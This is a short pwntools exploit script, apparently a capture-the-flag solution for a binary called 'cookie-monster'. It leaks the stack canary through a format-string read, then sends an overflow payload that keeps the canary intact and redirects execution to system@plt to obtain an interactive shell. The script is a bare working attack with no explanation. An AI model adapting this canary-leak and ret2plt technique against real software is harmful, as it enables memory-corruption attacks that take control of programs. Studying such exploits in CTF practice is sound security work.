from pwn import *

r = process('cookie-monster')
e = ELF('cookie-monster')
syscall_adr = p32(e.plt['system'])
# 0804A020
# syscall_adr = p32(int('0x0804A020', 16))

r.recvuntil('Enter your name:')

# Now get stack values
r.send('%15$8p\n')
v = r.readline().decode()
cookie = v.split(' ')[-1].strip()
c_hex = p32(int(cookie, 16))

r.recvuntil('purchase?\n')
payload = b'a'*32 + c_hex + b'a'*12 + syscall_adr + syscall_adr + p32(0x08048770)
print(payload)
r.sendline(payload)
print('here')
# print(r.recv())
# print(r.recv())

r.interactive()
